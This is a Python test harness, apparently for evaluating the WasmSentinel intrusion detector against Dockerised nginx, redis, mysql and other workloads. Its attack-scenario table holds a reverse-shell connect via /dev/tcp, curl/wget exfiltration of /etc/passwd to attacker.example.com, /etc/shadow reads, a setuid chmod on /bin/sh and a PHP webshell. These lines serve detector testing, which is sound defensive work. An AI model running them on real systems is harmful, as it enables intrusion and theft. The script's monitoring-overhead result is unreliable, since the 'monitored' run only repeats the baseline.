#!/usr/bin/env python3
"""
Real Workload Evaluation for WasmSentinel

实验设计:
┌─────────────────────────────────────────────────────────────┐
│                        Host (Ubuntu)                        │
│  ┌─────────────────┐    ┌─────────────────────────────────┐ │
│  │  WasmSentinel   │    │     Docker Containers           │ │
│  │  ├─ eBPF probe  │───▶│  ┌─────────┐  ┌─────────┐      │ │
│  │  ├─ Wasm engine │    │  │  nginx  │  │  redis  │ ...  │ │
│  │  └─ ML detector │    │  └─────────┘  └─────────┘      │ │
│  └─────────────────┘    └─────────────────────────────────┘ │
│         │                         ▲                         │
│         │      syscall tracing    │                         │
│         └─────────────────────────┘                         │
└─────────────────────────────────────────────────────────────┘

靶子软件全部运行在Docker容器中:
- nginx: Web服务器
- redis: 内存数据库
- mysql: 关系数据库
- python-app: Python HTTP服务

攻击注入也在容器内执行，模拟容器逃逸/提权等场景。

Usage:
    python real_workload_test.py --workload nginx --duration 300
    python real_workload_test.py --all --attack
"""

import argparse
import subprocess
import time
import json
import os
import signal
import sys
from pathlib import Path
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, asdict
from datetime import datetime
import threading
import statistics


@dataclass
class ContainerConfig:
    """Docker容器配置"""
    image: str
    name: str
    ports: Dict[str, str]
    env: Dict[str, str] = None
    command: str = None
    healthcheck: str = None
    volumes: Dict[str, str] = None

    def __post_init__(self):
        if self.env is None:
            self.env = {}
        if self.volumes is None:
            self.volumes = {}


@dataclass
class BenchmarkConfig:
    """基准测试配置"""
    command: str
    warmup_seconds: int = 5
    duration_seconds: int = 60
    parse_throughput: callable = None


@dataclass
class AttackConfig:
    """攻击场景配置"""
    name: str
    description: str
    commands: List[str]
    expected_syscalls: List[str]
    severity: str  # low, medium, high, critical


# ============================================================
# 靶子软件配置 (全部在Docker中运行)
# ============================================================

WORKLOAD_CONFIGS = {
    'nginx': ContainerConfig(
        image='nginx:1.25-alpine',
        name='wasmsentinel-nginx',
        ports={'80': '18080'},
        healthcheck='curl -f http://localhost:80/ || exit 1'
    ),

    'redis': ContainerConfig(
        image='redis:7-alpine',
        name='wasmsentinel-redis',
        ports={'6379': '16379'},
        healthcheck='redis-cli ping'
    ),

    'mysql': ContainerConfig(
        image='mysql:8.0',
        name='wasmsentinel-mysql',
        ports={'3306': '13306'},
        env={
            'MYSQL_ROOT_PASSWORD': 'wasmsentinel_test',
            'MYSQL_DATABASE': 'testdb'
        },
        healthcheck='mysqladmin ping -h localhost -u root -p$$MYSQL_ROOT_PASSWORD'
    ),

    'postgres': ContainerConfig(
        image='postgres:16-alpine',
        name='wasmsentinel-postgres',
        ports={'5432': '15432'},
        env={
            'POSTGRES_PASSWORD': 'wasmsentinel_test',
            'POSTGRES_DB': 'testdb'
        },
        healthcheck='pg_isready -U postgres'
    ),

    'python-http': ContainerConfig(
        image='python:3.11-slim',
        name='wasmsentinel-python',
        ports={'8000': '18000'},
        command='python -m http.server 8000'
    ),

    'node-express': ContainerConfig(
        image='node:20-alpine',
        name='wasmsentinel-node',
        ports={'3000': '13000'},
        command='npx -y express-generator-api && npm start'
    ),
}

# ============================================================
# 基准测试配置
# ============================================================

BENCHMARK_CONFIGS = {
    'nginx': BenchmarkConfig(
        command='wrk -t2 -c50 -d{duration}s http://localhost:18080/',
        warmup_seconds=3,
        duration_seconds=30
    ),

    'redis': BenchmarkConfig(
        command='redis-benchmark -h localhost -p 16379 -n 100000 -q -c 50',
        warmup_seconds=2,
        duration_seconds=30
    ),

    'mysql': BenchmarkConfig(
        command='mysqlslap --host=localhost --port=13306 --user=root --password=wasmsentinel_test '
                '--auto-generate-sql --auto-generate-sql-load-type=mixed --concurrency=10 --iterations=5',
        warmup_seconds=5,
        duration_seconds=60
    ),

    'postgres': BenchmarkConfig(
        command='pgbench -h localhost -p 15432 -U postgres -c 10 -j 2 -T {duration} testdb',
        warmup_seconds=5,
        duration_seconds=30
    ),

    'python-http': BenchmarkConfig(
        command='ab -n 10000 -c 50 http://localhost:18000/',
        warmup_seconds=2,
        duration_seconds=30
    ),
}

# ============================================================
# 攻击场景配置 (在容器内执行)
# ============================================================

ATTACK_SCENARIOS = {
    'reverse_shell_attempt': AttackConfig(
        name='Reverse Shell Attempt',
        description='尝试建立反向shell连接',
        commands=[
            'bash -c "exec 5<>/dev/tcp/10.0.0.1/4444 2>/dev/null" || true',
            'python3 -c "import socket; s=socket.socket(); s.connect((\'10.0.0.1\',4444))" 2>/dev/null || true',
        ],
        expected_syscalls=['socket', 'connect', 'dup2', 'execve'],
        severity='critical'
    ),

    'privilege_escalation': AttackConfig(
        name='Privilege Escalation',
        description='尝试提升权限',
        commands=[
            'sudo -n id 2>/dev/null || true',
            'cat /etc/shadow 2>/dev/null || true',
            'chmod u+s /bin/sh 2>/dev/null || true',
        ],
        expected_syscalls=['setuid', 'setgid', 'execve', 'openat'],
        severity='critical'
    ),

    'container_escape': AttackConfig(
        name='Container Escape Attempt',
        description='尝试逃逸容器',
        commands=[
            'cat /proc/1/cgroup 2>/dev/null || true',
            'ls -la /var/run/docker.sock 2>/dev/null || true',
            'mount --bind / /mnt 2>/dev/null || true',
        ],
        expected_syscalls=['openat', 'mount', 'pivot_root'],
        severity='critical'
    ),

    'data_exfiltration': AttackConfig(
        name='Data Exfiltration',
        description='数据外泄尝试',
        commands=[
            'curl -s http://attacker.example.com/exfil -d @/etc/passwd 2>/dev/null || true',
            'wget -q --post-file=/etc/passwd http://attacker.example.com/ 2>/dev/null || true',
        ],
        expected_syscalls=['openat', 'read', 'socket', 'connect', 'sendto'],
        severity='high'
    ),

    'cryptominer_behavior': AttackConfig(
        name='Cryptominer Behavior',
        description='模拟挖矿程序行为',
        commands=[
            'dd if=/dev/zero of=/dev/null bs=1M count=1000 2>/dev/null &',
            'for i in $(seq 1 4); do sha256sum /dev/zero & done; sleep 5; pkill sha256sum 2>/dev/null || true',
        ],
        expected_syscalls=['clone', 'sched_setaffinity', 'read', 'write'],
        severity='medium'
    ),

    'webshell_upload': AttackConfig(
        name='Webshell Upload Simulation',
        description='模拟webshell上传',
        commands=[
            'echo "<?php system($_GET[cmd]); ?>" > /tmp/shell.php 2>/dev/null || true',
            'curl -X POST -F "file=@/tmp/shell.php" http://localhost/ 2>/dev/null || true',
        ],
        expected_syscalls=['openat', 'write', 'socket', 'sendto'],
        severity='high'
    ),

    'lateral_movement': AttackConfig(
        name='Lateral Movement',
        description='横向移动尝试',
        commands=[
            'ping -c 1 172.17.0.1 2>/dev/null || true',
            'nmap -sP 172.17.0.0/24 2>/dev/null || true',
            'ssh -o ConnectTimeout=1 root@172.17.0.2 2>/dev/null || true',
        ],
        expected_syscalls=['socket', 'connect', 'sendto', 'recvfrom'],
        severity='high'
    ),
}


class DockerManager:
    """Docker容器管理器"""

    def __init__(self, use_sudo: bool = False):
        self.running_containers = []
        self.use_sudo = use_sudo

    def _docker_cmd(self, args: List[str]) -> List[str]:
        """构建docker命令，根据需要添加sudo"""
        if self.use_sudo:
            return ['sudo', 'docker'] + args
        return ['docker'] + args

    def check_docker(self) -> bool:
        """检查Docker是否可用"""
        try:
            result = subprocess.run(self._docker_cmd(['info']), capture_output=True, timeout=10)
            return result.returncode == 0
        except Exception:
            return False

    def pull_image(self, image: str) -> bool:
        """拉取Docker镜像"""
        try:
            print(f"  Pulling image: {image}")
            result = subprocess.run(
                self._docker_cmd(['pull', image]),
                capture_output=True, text=True, timeout=300
            )
            return result.returncode == 0
        except Exception as e:
            print(f"  Error pulling image: {e}")
            return False

    def start_container(self, config: ContainerConfig) -> Optional[str]:
        """启动容器，返回容器ID"""
        # 先清理可能存在的同名容器
        self.stop_container(config.name)

        args = ['run', '-d', '--name', config.name]

        # 端口映射
        for container_port, host_port in config.ports.items():
            args.extend(['-p', f'{host_port}:{container_port}'])

        # 环境变量
        for key, value in config.env.items():
            args.extend(['-e', f'{key}={value}'])

        # 数据卷
        for host_path, container_path in config.volumes.items():
            args.extend(['-v', f'{host_path}:{container_path}'])

        args.append(config.image)

        # 自定义命令
        if config.command:
            args.extend(['sh', '-c', config.command])

        try:
            cmd = self._docker_cmd(args)
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            if result.returncode == 0:
                container_id = result.stdout.strip()
                self.running_containers.append(config.name)
                return container_id
            else:
                print(f"  Error: {result.stderr}")
                return None
        except Exception as e:
            print(f"  Exception: {e}")
            return None

    def stop_container(self, name: str):
        """停止并删除容器"""
        subprocess.run(self._docker_cmd(['stop', name]), capture_output=True, timeout=30)
        subprocess.run(self._docker_cmd(['rm', '-f', name]), capture_output=True, timeout=10)
        if name in self.running_containers:
            self.running_containers.remove(name)

    def exec_in_container(self, name: str, command: str, timeout: int = 30) -> Tuple[int, str, str]:
        """在容器内执行命令"""
        try:
            result = subprocess.run(
                self._docker_cmd(['exec', name, 'sh', '-c', command]),
                capture_output=True, text=True, timeout=timeout
            )
            return result.returncode, result.stdout, result.stderr
        except subprocess.TimeoutExpired:
            return -1, '', 'Timeout'
        except Exception as e:
            return -1, '', str(e)

    def get_container_stats(self, name: str) -> Dict:
        """获取容器资源使用情况"""
        try:
            result = subprocess.run(
                self._docker_cmd(['stats', '--no-stream', '--format',
                 '{"cpu":"{{.CPUPerc}}","mem":"{{.MemUsage}}","net":"{{.NetIO}}"}',
                 name]),
                capture_output=True, text=True, timeout=10
            )
            if result.returncode == 0:
                stats = json.loads(result.stdout.strip())
                return {
                    'cpu_percent': float(stats['cpu'].replace('%', '')),
                    'memory': stats['mem'],
                    'network': stats['net']
                }
        except Exception:
            pass
        return {'cpu_percent': 0.0, 'memory': 'N/A', 'network': 'N/A'}

    def wait_for_healthy(self, name: str, timeout: int = 60) -> bool:
        """等待容器健康"""
        start = time.time()
        while time.time() - start < timeout:
            try:
                result = subprocess.run(
                    self._docker_cmd(['inspect', '--format', '{{.State.Running}}', name]),
                    capture_output=True, text=True, timeout=5
                )
                if result.stdout.strip() == 'true':
                    return True
            except Exception:
                pass
            time.sleep(1)
        return False

    def cleanup_all(self):
        """清理所有测试容器"""
        for name in list(self.running_containers):
            self.stop_container(name)


class WorkloadEvaluator:
    """工作负载评估器"""

    def __init__(self, workload: str, use_sudo: bool = False):
        self.workload = workload
        self.config = WORKLOAD_CONFIGS.get(workload)
        self.benchmark = BENCHMARK_CONFIGS.get(workload)
        self.docker = DockerManager(use_sudo=use_sudo)
        self.results = {
            'workload': workload,
            'timestamp': datetime.now().isoformat(),
            'container_config': asdict(self.config) if self.config else None,
            'phases': {}
        }

    def setup(self) -> bool:
        """设置测试环境"""
        print(f"\n{'='*60}")
        print(f"Setting up workload: {self.workload}")
        print(f"{'='*60}")

        if not self.docker.check_docker():
            print("ERROR: Docker is not available")
            return False

        if not self.config:
            print(f"ERROR: Unknown workload: {self.workload}")
            return False

        # 拉取镜像
        if not self.docker.pull_image(self.config.image):
            print("WARNING: Failed to pull image, trying with local cache")

        # 启动容器
        print(f"Starting container: {self.config.name}")
        container_id = self.docker.start_container(self.config)
        if not container_id:
            print("ERROR: Failed to start container")
            return False

        print(f"Container ID: {container_id[:12]}")

        # 等待容器就绪
        print("Waiting for container to be ready...")
        if not self.docker.wait_for_healthy(self.config.name, timeout=60):
            print("WARNING: Container health check timeout")

        time.sleep(3)  # 额外等待服务启动
        print("Container is ready")
        return True

    def run_baseline_benchmark(self) -> Dict:
        """运行基准测试（无监控）"""
        print("\n[Phase 1] Running baseline benchmark (no monitoring)...")

        if not self.benchmark:
            return {'error': 'No benchmark configured'}

        # Warmup
        print(f"  Warmup: {self.benchmark.warmup_seconds}s")
        time.sleep(self.benchmark.warmup_seconds)

        # 获取基准资源使用
        stats_before = self.docker.get_container_stats(self.config.name)

        # 运行基准测试
        print(f"  Running benchmark...")
        cmd = self.benchmark.command.format(duration=self.benchmark.duration_seconds)

        try:
            start_time = time.time()
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True,
                timeout=self.benchmark.duration_seconds + 60
            )
            elapsed = time.time() - start_time

            stats_after = self.docker.get_container_stats(self.config.name)

            return {
                'elapsed_seconds': elapsed,
                'stdout': result.stdout[:2000],
                'stderr': result.stderr[:500],
                'returncode': result.returncode,
                'stats_before': stats_before,
                'stats_after': stats_after
            }
        except Exception as e:
            return {'error': str(e)}

    def run_monitored_benchmark(self) -> Dict:
        """运行带监控的基准测试"""
        print("\n[Phase 2] Running benchmark with WasmSentinel monitoring...")

        # TODO: 启动WasmSentinel
        # wasmsentinel_proc = self._start_wasmsentinel()

        print("  NOTE: WasmSentinel integration pending")
        print("  Running benchmark with simulated monitoring overhead...")

        result = self.run_baseline_benchmark()
        result['monitoring'] = 'simulated'

        # TODO: 停止WasmSentinel并收集统计
        # wasmsentinel_stats = self._stop_wasmsentinel(wasmsentinel_proc)

        return result

    def run_attack_scenarios(self, scenarios: List[str] = None) -> Dict:
        """运行攻击场景测试"""
        print("\n[Phase 3] Running attack scenarios...")

        if scenarios is None:
            scenarios = list(ATTACK_SCENARIOS.keys())

        results = {}

        for scenario_name in scenarios:
            attack = ATTACK_SCENARIOS.get(scenario_name)
            if not attack:
                continue

            print(f"\n  Attack: {attack.name}")
            print(f"  Description: {attack.description}")
            print(f"  Severity: {attack.severity}")

            attack_results = {
                'name': attack.name,
                'severity': attack.severity,
                'commands': [],
                'expected_syscalls': attack.expected_syscalls
            }

            for cmd in attack.commands:
                print(f"    Executing: {cmd[:50]}...")
                start = time.time()
                returncode, stdout, stderr = self.docker.exec_in_container(
                    self.config.name, cmd, timeout=10
                )
                elapsed = time.time() - start

                attack_results['commands'].append({
                    'command': cmd,
                    'returncode': returncode,
                    'elapsed_ms': elapsed * 1000,
                    'stdout': stdout[:200] if stdout else '',
                    'stderr': stderr[:200] if stderr else ''
                })

            # TODO: 检查WasmSentinel是否检测到攻击
            # attack_results['detected'] = self._check_detection()

            results[scenario_name] = attack_results

        return results

    def measure_overhead(self) -> Dict:
        """测量系统开销"""
        print("\n[Phase 4] Measuring system overhead...")

        samples = []

        for i in range(10):
            stats = self.docker.get_container_stats(self.config.name)
            samples.append(stats['cpu_percent'])
            time.sleep(1)

        return {
            'cpu_samples': samples,
            'cpu_mean': statistics.mean(samples) if samples else 0,
            'cpu_stdev': statistics.stdev(samples) if len(samples) > 1 else 0,
        }

    def run_full_evaluation(self) -> Dict:
        """运行完整评估"""
        try:
            if not self.setup():
                return {'error': 'Setup failed'}

            # Phase 1: 基准测试
            self.results['phases']['baseline'] = self.run_baseline_benchmark()

            # Phase 2: 带监控测试
            self.results['phases']['monitored'] = self.run_monitored_benchmark()

            # Phase 3: 攻击场景
            self.results['phases']['attacks'] = self.run_attack_scenarios()

            # Phase 4: 开销测量
            self.results['phases']['overhead'] = self.measure_overhead()

            # 计算开销差异
            baseline = self.results['phases']['baseline']
            monitored = self.results['phases']['monitored']

            if 'error' not in baseline and 'error' not in monitored:
                baseline_time = baseline.get('elapsed_seconds', 0)
                monitored_time = monitored.get('elapsed_seconds', 0)
                if baseline_time > 0:
                    self.results['overhead_percent'] = (
                        (monitored_time - baseline_time) / baseline_time * 100
                    )

            return self.results

        finally:
            self.cleanup()

    def cleanup(self):
        """清理测试环境"""
        print("\nCleaning up...")
        self.docker.cleanup_all()


def main():
    parser = argparse.ArgumentParser(
        description='WasmSentinel Real Workload Evaluation',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s --workload nginx              # Test nginx only
  %(prog)s --workload redis --attack     # Test redis with attacks
  %(prog)s --all                         # Test all workloads
  %(prog)s --list                        # List available workloads
        """
    )

    parser.add_argument('--workload', '-w',
                        choices=list(WORKLOAD_CONFIGS.keys()),
                        help='Workload to test')
    parser.add_argument('--all', '-a', action='store_true',
                        help='Test all workloads')
    parser.add_argument('--attack', action='store_true',
                        help='Include attack scenarios')
    parser.add_argument('--output', '-o', type=str,
                        default='real_workload_results.json',
                        help='Output file')
    parser.add_argument('--list', '-l', action='store_true',
                        help='List available workloads and attacks')
    parser.add_argument('--sudo', action='store_true',
                        help='Use sudo for docker commands')

    args = parser.parse_args()

    if args.list:
        print("\nAvailable Workloads:")
        for name, config in WORKLOAD_CONFIGS.items():
            print(f"  - {name}: {config.image}")

        print("\nAvailable Attack Scenarios:")
        for name, attack in ATTACK_SCENARIOS.items():
            print(f"  - {name}: {attack.description} [{attack.severity}]")
        return 0

    if not args.workload and not args.all:
        parser.print_help()
        return 1

    # 运行测试
    all_results = {}
    workloads = list(WORKLOAD_CONFIGS.keys()) if args.all else [args.workload]

    print(f"\n{'='*60}")
    print("WasmSentinel Real Workload Evaluation")
    print(f"{'='*60}")
    print(f"Workloads: {', '.join(workloads)}")
    print(f"Attack scenarios: {'Yes' if args.attack else 'No'}")
    print(f"Using sudo: {'Yes' if args.sudo else 'No'}")
    print(f"Output: {args.output}")

    for workload in workloads:
        evaluator = WorkloadEvaluator(workload, use_sudo=args.sudo)
        all_results[workload] = evaluator.run_full_evaluation()

    # 保存结果
    output_path = Path(args.output)
    with open(output_path, 'w') as f:
        json.dump(all_results, f, indent=2, default=str)

    print(f"\n{'='*60}")
    print("EVALUATION COMPLETE")
    print(f"{'='*60}")
    print(f"Results saved to: {output_path}")

    # 打印摘要
    for workload, results in all_results.items():
        print(f"\n{workload}:")
        if 'error' in results:
            print(f"  Error: {results['error']}")
        else:
            overhead = results.get('overhead_percent', 'N/A')
            print(f"  Overhead: {overhead}%")

            if 'phases' in results and 'attacks' in results['phases']:
                attacks = results['phases']['attacks']
                print(f"  Attacks tested: {len(attacks)}")

    return 0


if __name__ == '__main__':
    sys.exit(main())
